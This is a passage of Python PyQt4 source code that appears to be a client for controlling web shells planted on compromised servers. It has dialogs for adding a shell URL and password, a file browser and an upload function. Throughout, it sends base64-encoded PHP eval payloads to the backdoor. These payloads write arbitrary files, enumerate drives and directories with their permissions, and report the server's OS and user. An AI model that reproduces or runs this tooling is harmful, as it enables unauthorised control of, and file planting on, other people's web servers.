            self.table.setCellWidget(current_all_row,4,lbl_dp)
            # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
            # 否则无法使用customContextMenuRequested信号
            lbl_dn.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_dn.customContextMenuRequested.connect(self.dMenu)
            lbl_dt.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_dt.customContextMenuRequested.connect(self.dMenu)
            lbl_ds.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_ds.customContextMenuRequested.connect(self.dMenu)
            lbl_dp.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_dp.customContextMenuRequested.connect(self.dMenu)
 
            print 'add dir success.'
        else:
            QtGui.QMessageBox.warning( self, "Error", "No Permission!")

        # self.npath = tpath

    def upload(self):
        fname = QtGui.QFileDialog.getOpenFileName(self,'upload','C:')
        # print fname

        filedata = ''
        if fname:
            with open(fname,'rb') as f:
                filedata = f.read()
        # print data

        tpath = self.npath
        st = self.item.text(0)
        if ':' in self.path:
            self.get_path(self.item, st)
        else:
            self.get_path1(self.item, st) # 得到路径
        
        upfilename = str(self.npath+'/'+fname.split('/')[-1]) #带文件名的路径
        # print upfilename

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oInx8fCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pO2VjaG8oQGZ3cml0ZShmb3BlbigkZiwidyIpLCRjKT8iMSI6IjAiKTs7ZWNobygifHx8Iik7ZGllKCk7&z1="+base64.b64encode(upfilename)+"&z2="+base64.b64encode(filedata))
        print payload
        html = requests.post(self.url,data=payload,headers=header).content
        print 'html',html
        if '1' in html:
            current_all_row = self.table.rowCount() # 得到当前总行数
            self.table.setRowCount(current_all_row+1) # 总行数加1

            lbl_fico = QtGui.QLabel(self)
            pix = QtGui.QPixmap("file.ico")
            lbl_fico.setScaledContents(True)
            lbl_fico.setPixmap(pix)
            lbl_fn = QtGui.QLabel(fname.split('/')[-1],self)
            lbl_ft = QtGui.QLabel(time.strftime("%Y-%m-%d %H:%M:%S",time.localtime(time.time())),self)
            lbl_fs = QtGui.QLabel(str(len(filedata)),self)
            lbl_fp = QtGui.QLabel('xxx',self)
            self.table.setCellWidget(current_all_row,0,lbl_fico)
            self.table.setCellWidget(current_all_row,1,lbl_fn)
            self.table.setCellWidget(current_all_row,2,lbl_ft)
            self.table.setCellWidget(current_all_row,3,lbl_fs)
            self.table.setCellWidget(current_all_row,4,lbl_fp)
            # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
            # 否则无法使用customContextMenuRequested信号
            lbl_fn.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fn.customContextMenuRequested.connect(self.fMenu)
            lbl_ft.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_ft.customContextMenuRequested.connect(self.fMenu)
            lbl_fs.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fs.customContextMenuRequested.connect(self.fMenu)
            lbl_fp.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
            lbl_fp.customContextMenuRequested.connect(self.fMenu)
            print 'add dir success.'
        else:
            QtGui.QMessageBox.warning( self, "Error", "No Permission!")

        self.npath = tpath

class TreeClass(QtGui.QTreeWidget):
    def __init__(self,url, pwd,parent=None):
        super(TreeClass, self).__init__(parent)
        self.resize(100,100)
        self.url = url
        self.pwd = pwd
        self.path = ''
        self.item = None
        self.dirlist = []
        self.filelist = []

        self.init_UI()

    def init_UI(self):
        self.setColumnCount(1)
        self.setHeaderLabels(['-'])

        payload = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9fHx8IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJ8fHwiOyR1PShmdW5jdGlvbl9leGlzdHMoJ3Bvc2l4X2dldGVnaWQnKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOicnOyR1c3I9KCR1KT8kdVsnbmFtZSddOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iKHskdXNyfSkiO3ByaW50ICRSO2RpZSgpOw==")
        html = requests.post(self.url,data=payload,headers=header).content
        l1 = html.split('|||')
        print 'l1',l1

        self.path = l1[0]

        payload2 = str(self.pwd+"=@eval(base64_decode($_POST[action]));&action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApOyREPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTskRj1Ab3BlbmRpcigkRCk7aWYoJEY9PU5VTEwpe2VjaG8oIkVSUk9SOi8vIFBhdGggTm90IEZvdW5kIE9yIE5vIFBlcm1pc3Npb24hIik7fWVsc2V7JE09TlVMTDskTD1OVUxMO3doaWxlKCROPUByZWFkZGlyKCRGKSl7JFA9JEQuIi8iLiROOyRUPUBkYXRlKCJZLW0tZCBIOmk6cyIsQGZpbGVtdGltZSgkUCkpO0AkRT1zdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTskUj0ifHx8Ii4kVC4ifHx8Ii5AZmlsZXNpemUoJFApLiJ8fHwiLiRFLiJ8fHwiO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9O2RpZSgpOw==&z1="+base64.b64encode(l1[0]))
        html = requests.post(self.url,data=payload2,headers=header).content
        l2 = html.split('|||')[:-1]
        
        for x in range(len(l2))[::4]:
            if '/' in l2[x]:
                if '.' not in l2[x]:
                    dlist = {}
                    dlist['dn'] = l2[x][:-1]
                    dlist['dt'] = l2[x+1]
                    dlist['ds'] = l2[x+2]
                    dlist['dp'] = l2[x+3]
                    self.dirlist.append(dlist)
                else:
                    continue
            else:
                flist = {}
                flist['fn'] = l2[x]
                flist['ft'] = l2[x+1]
                flist['fs'] = l2[x+2]
                flist['fp'] = l2[x+3]
                self.filelist.append(flist)
        if len(l1)>2:
            if l1[1]:
                drives = l1[1].split(':')[:-1]
                # childn = None
                for x in range(len(drives)):
                    # print drives[x]
                    t = QtGui.QTreeWidgetItem()
                    t.setText(0,drives[x])
                    t.setIcon(0,QtGui.QIcon("disk.ico"))
                    if drives[x] in self.path:
                        # print 'xxx'
                        childn = self.path.split('/')[1:]
                        ln = []
                        for x in range(len(self.dirlist)):
                            ln.append(self.dirlist[x]['dn'])
                        childn.append(ln)
                        print childn
                        self.addchild(t, childn)
                    self.setItemExpanded(t,True)  #默认展开
                    self.expandAll()
                    self.insertTopLevelItem(x,t)
            else:
                # print l1[0]
                t = QtGui.QTreeWidgetItem()
                t.setText(0,'/')

                childn = self.path.split('/')[1:]
                ln = []
                for x in range(len(self.dirlist)):
                    ln.append(self.dirlist[x]['dn'])
                childn.append(ln)
                self.addchild(t, childn)

                self.setItemExpanded(t,True)  #默认展开
                self.expandAll()
                self.insertTopLevelItem(0,t)
        else:
            QtGui.QMessageBox.warning(self, "Error", "connect error")

    def addchild(self,root,plist):
        child = None
        # print len(plist)
        if len(plist)>0:
            n = plist.pop(0)
            # print type(n)
            if 'list' in str(type(n)):
                if len(n)>0:
                    for x in n:
                        child = QtGui.QTreeWidgetItem()
                        child.setText(0,x)
                        child.setIcon(0,QtGui.QIcon("dir.ico"))
                        root.addChild(child)
                        self.item = root
            else:
                child = QtGui.QTreeWidgetItem()
                child.setText(0,n)
                child.setIcon(0,QtGui.QIcon("dir.ico"))
                root.addChild(child)
                self.item = child
            self.addchild(child, plist)

class addNewShell(QtGui.QDialog):  # 添加shell时的窗口
    def __init__(self):
        super(addNewShell, self).__init__()
        self.setWindowTitle("AddShell")
        self.resize(400,100)
        self.setupUi()

    def setupUi(self): # 添加shell时的弹窗界面
        self.lbl_url = QtGui.QLabel('URL:')
        self.urlEdit = QtGui.QLineEdit('http://')
        self.lbl_pass = QtGui.QLabel('PASS:')
        self.passEdit = QtGui.QLineEdit()
        self.add_btn = QtGui.QPushButton('Add',self)
        self.add_btn.clicked.connect(self.close)

        grid = QtGui.QGridLayout()
        grid.setSpacing(10)

        grid.addWidget(self.lbl_url,1,0)
        grid.addWidget(self.urlEdit,1,1,1,2)
        grid.addWidget(self.lbl_pass,2,0)
        grid.addWidget(self.passEdit,2,1)
        grid.addWidget(self.add_btn,2,2)

        self.setLayout(grid)


class editShell(QtGui.QDialog):  # 修改shell时的窗口
    def __init__(self, url, pwd):
        super(editShell, self).__init__()
        self.resize(400,100)
        self.url = url
        self.pwd = pwd
        self.setWindowTitle("EditShell")
        self.setupUi()

    def setupUi(self):
        self.lbl_url = QtGui.QLabel('URL:')
        self.urlEdit = QtGui.QLineEdit(self.url)
        self.lbl_pass = QtGui.QLabel('PASS:')
        self.passEdit = QtGui.QLineEdit(self.pwd)
        self.edit_btn = QtGui.QPushButton('Edit',self)
        self.edit_btn.clicked.connect(self.close)

        grid = QtGui.QGridLayout()
        grid.setSpacing(10)

        grid.addWidget(self.lbl_url,1,0)
        grid.addWidget(self.urlEdit,1,1,1,2)
        grid.addWidget(self.lbl_pass,2,0)
        grid.addWidget(self.passEdit,2,1)
        grid.addWidget(self.edit_btn,2,2)

        self.setLayout(grid)

class editFile(QtGui.QDialog):
    """docstring for editFile"""
    def __init__(self, text):
        super(editFile, self).__init__()
        self.setWindowTitle('EditFile')
        self.resize(500,400)
        self.text = text

        self.fileEdit = QtGui.QTextEdit()
        self.fileEdit.append(self.text)
        self.btn = QtGui.QPushButton('Save',self)
        self.btn.clicked.connect(self.close)
        
        grid = QtGui.QGridLayout()
        grid.setSpacing(10)

        grid.addWidget(self.fileEdit,1,0)
        grid.addWidget(self.btn,2,0)

        self.setLayout(grid)

class NewFile(QtGui.QDialog):
    """docstring for NewFile"""
    def __init__(self):
        super(NewFile, self).__init__()
        self.setWindowTitle('NewFile')
        self.resize(500,400)
        
        self.lbl_name = QtGui.QLabel('Name: ')
        self.text_name = QtGui.QLineEdit()
        self.content = QtGui.QTextEdit()
        self.btn = QtGui.QPushButton('Create',self)
        self.btn.clicked.connect(self.close)

        gird = QtGui.QGridLayout()
        gird.setSpacing(10)
        gird.addWidget(self.lbl_name,1,0)
        gird.addWidget(self.text_name,1,1)
        gird.addWidget(self.content,2,0,1,2)
        gird.addWidget(self.btn,3,0)

        self.setLayout(gird)

class NewDir(QtGui.QDialog):
    """docstring for NewFile"""
    def __init__(self):
        super(NewDir, self).__init__()
        self.setWindowTitle('NewDir')
        self.resize(300,100)
        
        self.lbl_name = QtGui.QLabel('Name: ')
        self.text_name = QtGui.QLineEdit()
        self.btn = QtGui.QPushButton('CreateDir',self)
        self.btn.clicked.connect(self.close)

        gird = QtGui.QGridLayout()
        gird.setSpacing(10)
        gird.addWidget(self.lbl_name,1,0)
        gird.addWidget(self.text_name,1,1)
        gird.addWidget(self.btn,2,0)

        self.setLayout(gird)

class AddCmdTab(QtGui.QTabWidget):
    """docstring for CmdClass"""
    def __init__(self, url, pwd):
        super(AddCmdTab, self).__init__()
        self.setWindowTitle('Cmd')
        self.url = url
        self.pwd = pwd
        self.content = ''
        self.prefix = '>'

        # self.init_UI()

    def init_UI(self):
        self.command = QtGui.QPlainTextEdit(self)
        self.command.appendPlainText('xxxxxxxxxxxx')
    def sendmsg(self):
        print 'ssss'
        print self.command.toPlainText()

    def keyPressEvent(self,event):
        k = QtGui.QKeyEvent(event)
        print k.key()
        print k.text()


if __name__ == "__main__":
    app = QtGui.QApplication(sys.argv)
    widget = MainWindow()
    widget.show()
    app.exec_()
